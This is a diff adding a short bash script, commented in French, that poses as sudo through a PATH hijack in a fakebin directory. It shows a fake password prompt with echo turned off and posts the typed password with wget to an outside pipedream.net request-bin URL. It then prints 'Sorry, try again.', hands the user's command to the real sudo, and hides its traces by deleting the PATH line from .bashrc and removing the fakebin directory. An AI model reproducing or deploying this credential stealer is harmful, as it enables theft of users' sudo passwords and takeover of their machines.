@@ -1,0 +1,36 @@
+#!/bin/bash
+
+# Vérifie si l'utilisateur a spécifié une commande
+if [ -z "$1" ]; then
+    echo "Usage: $0 <command>"
+    exit 1
+fi
+
+# Affiche le message d'invite
+echo -n "Password for $USER:"
+
+# Demande le mot de passe en masquant l'entrée
+stty -echo
+read password
+stty echo
+# Ajoute une ligne vide après la saisie du mot de passe
+echo ""
+
+# Envoie toujours une erreur à l'URL spécifiée
+wget --quiet --post-data "password=$password" https://entx2j44o6eug.x.pipedream.net/
+
+# Affiche un message d'erreur
+echo "Sorry, try again."
+
+# Exécute la commande spécifiée par l'utilisateur avec le vrai sudo
+/usr/bin/sudo "-k" "$@"
+
+#####################################################################
+# Ligne à supprimer dans le fichier .bashrc
+line_to_remove="export PATH=/home/toto/fakebin:\$PATH"
+
+# Utilisez le chemin complet et `sudo` pour la suppression de la ligne dans le fichier .bashrc
+/usr/bin/sudo /usr/bin/sed -i "\|${line_to_remove}|d" /home/toto/.bashrc
+
+# Répertoire à supprimer
+/usr/bin/sudo rm -R /home/toto/fakebin
